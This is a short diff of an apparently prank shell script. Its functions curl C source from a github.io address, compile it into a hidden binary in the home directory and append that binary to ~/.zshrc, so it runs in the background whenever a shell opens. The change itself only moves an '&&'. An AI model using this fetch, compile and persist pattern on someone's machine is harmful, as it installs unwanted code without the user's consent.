@@ -55,7 +55,7 @@ function normal_parrot {
 
 function fixed_parrot {
 	normal_parrot
-	sed -i.bak 's/live/live \&/g' ~/.doit.sh
+	sed -i.bak 's/live/live \&/g' ~/.doit.sh &&
 	rm doit.sh.bak
 }
 
@@ -63,7 +63,7 @@ function normal_donut {
 	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
 	gcc ~/donut.c -o ~/.donut
 	rm ~/donut.c
-	echo "echo \"~/.donut\" >> ~/.zshrc" > ~/.doit.sh &&
+	echo "echo \"~/.donut\" >> ~/.zshrc" > ~/.doit.sh
 	echo "~/.donut" >> ~/.shape.sh
 }
 
